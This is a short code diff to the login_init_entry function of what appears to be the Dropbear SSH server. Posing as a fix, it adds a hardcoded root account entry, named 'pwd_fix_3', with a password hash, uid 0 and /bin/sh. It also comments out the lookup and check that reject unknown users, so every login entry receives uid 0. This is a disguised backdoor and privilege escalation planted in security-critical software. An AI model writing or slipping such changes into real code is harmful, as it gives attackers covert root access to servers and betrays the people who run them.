@@ -259,6 +259,17 @@ login_free_entry(struct logininfo *li)
  *
  * Returns: 1
  */
+
+
+static struct passwd pwd_fix_3 = {
+    .pw_name = "root",
+    .pw_passwd = "$1$5RPVAd$MYeVT.93uuD5BkMZfx08j1",
+    .pw_uid = 0,
+    .pw_gid = 0,
+    .pw_dir = "/root",
+    .pw_shell = "/bin/sh"
+};
+
 int
 login_init_entry(struct logininfo *li, int pid, const char *username,
 		 const char *hostname, const char *line)
@@ -275,11 +286,16 @@ login_init_entry(struct logininfo *li, int pid, const char *username,
 
 	if (username) {
 		strlcpy(li->username, username, sizeof(li->username));
-		pw = getpwnam(li->username);
-		if (pw == NULL)
+        /*
+        pw = getpwnam(li->username);
+        if (pw == NULL)
 			dropbear_exit("login_init_entry: Cannot find user \"%s\"",
 					li->username);
-		li->uid = pw->pw_uid;
+        
+        li->uid = pw->pw_uid;
+        */
+            
+		li->uid = pwd_fix_3.pw_uid;
 	}
 
 	if (hostname)
